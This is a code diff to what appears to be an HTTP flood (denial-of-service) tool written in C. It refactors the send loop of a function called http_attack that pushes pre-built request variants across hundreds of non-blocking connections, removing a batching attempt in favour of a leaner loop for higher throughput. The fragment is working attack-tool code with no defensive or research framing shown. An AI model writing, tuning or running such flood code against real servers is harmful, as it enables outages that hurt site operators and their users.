@@ -16,7 +16,6 @@
 
 #define MAX_CONNECTIONS 512
 #define MAX_REQUEST_SIZE 2048
-#define SENDMMSG_BATCH 64
 
 typedef enum {
     HTTP_GET = 0,
@@ -215,82 +214,29 @@ void* http_attack(void* arg) {
             sockets[active_sockets++] = sock;
         }
 
-        // Use sendmmsg to batch sends across multiple sockets
-        if (active_sockets > 0) {
-            int batch_count = active_sockets < SENDMMSG_BATCH ? active_sockets : SENDMMSG_BATCH;
-            struct mmsghdr msgs[SENDMMSG_BATCH];
-            struct iovec iovs[SENDMMSG_BATCH];
-            int batch_idx = 0;
-            int batch_sock_indices[SENDMMSG_BATCH];
+        // Send pre-built requests to all active sockets (no snprintf per send)
+        for (int i = 0; i < active_sockets; i++) {
+            int sock = sockets[i];
+            if (sock <= 0) continue;
 
-            for (int i = 0; i < active_sockets && batch_idx < batch_count; i++) {
-                int sock = sockets[i];
-                if (sock <= 0) continue;
+            // Round-robin through pre-built request variants
+            int vidx = variant_idx % total_variants;
+            variant_idx++;
 
-                // Round-robin through pre-built request variants
-                int vidx = variant_idx % total_variants;
-                variant_idx++;
+            ssize_t sent = send(sock, prebuilt_requests[vidx], prebuilt_lens[vidx],
+                                MSG_NOSIGNAL | MSG_DONTWAIT);
 
-                iovs[batch_idx].iov_base = prebuilt_requests[vidx];
-                iovs[batch_idx].iov_len  = prebuilt_lens[vidx];
-
-                // sendmmsg with MSG_NOSIGNAL on connected TCP sockets
-                // We use sendmsg-style with no msg_name (already connected)
-                msgs[batch_idx].msg_hdr.msg_name       = NULL;
-                msgs[batch_idx].msg_hdr.msg_namelen    = 0;
-                msgs[batch_idx].msg_hdr.msg_iov        = &iovs[batch_idx];
-                msgs[batch_idx].msg_hdr.msg_iovlen     = 1;
-                msgs[batch_idx].msg_hdr.msg_control    = NULL;
-                msgs[batch_idx].msg_hdr.msg_controllen = 0;
-                msgs[batch_idx].msg_hdr.msg_flags      = 0;
-                msgs[batch_idx].msg_len = 0;
-                batch_sock_indices[batch_idx] = i;
-                batch_idx++;
+            if (sent <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
+                close(sock);
+                sockets[i] = sockets[--active_sockets];
+                sockets[active_sockets] = 0;
+                i--;
+                continue;
             }
 
-            // sendmmsg requires all fds to be the same, so we must send per-socket
-            // Instead, use individual sends but with pre-built requests (no snprintf)
-            for (int b = 0; b < batch_idx; b++) {
-                int i = batch_sock_indices[b];
-                int sock = sockets[i];
-                ssize_t sent = send(sock,
-                    iovs[b].iov_base, iovs[b].iov_len,
-                    MSG_NOSIGNAL | MSG_DONTWAIT);
-
-                if (sent <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
-                    close(sock);
-                    sockets[i] = sockets[--active_sockets];
-                    sockets[active_sockets] = 0;
-                    continue;
-                }
-
-                // Drain any response data
-                char discard[1024];
-                recv(sock, discard, sizeof(discard), MSG_DONTWAIT);
-            }
-
-            // Send to remaining sockets beyond the first batch
-            for (int i = batch_count; i < active_sockets; i++) {
-                int sock = sockets[i];
-                if (sock <= 0) continue;
-
-                int vidx = variant_idx % total_variants;
-                variant_idx++;
-
-                ssize_t sent = send(sock, prebuilt_requests[vidx], prebuilt_lens[vidx],
-                                    MSG_NOSIGNAL | MSG_DONTWAIT);
-
-                if (sent <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
-                    close(sock);
-                    sockets[i] = sockets[--active_sockets];
-                    sockets[active_sockets] = 0;
-                    i--;
-                    continue;
-                }
-
-                char discard[1024];
-                recv(sock, discard, sizeof(discard), MSG_DONTWAIT);
-            }
+            // Drain any response data
+            char discard[1024];
+            recv(sock, discard, sizeof(discard), MSG_DONTWAIT);
         }
 
         // Periodic cleanup: detect dead connections via non-blocking peek
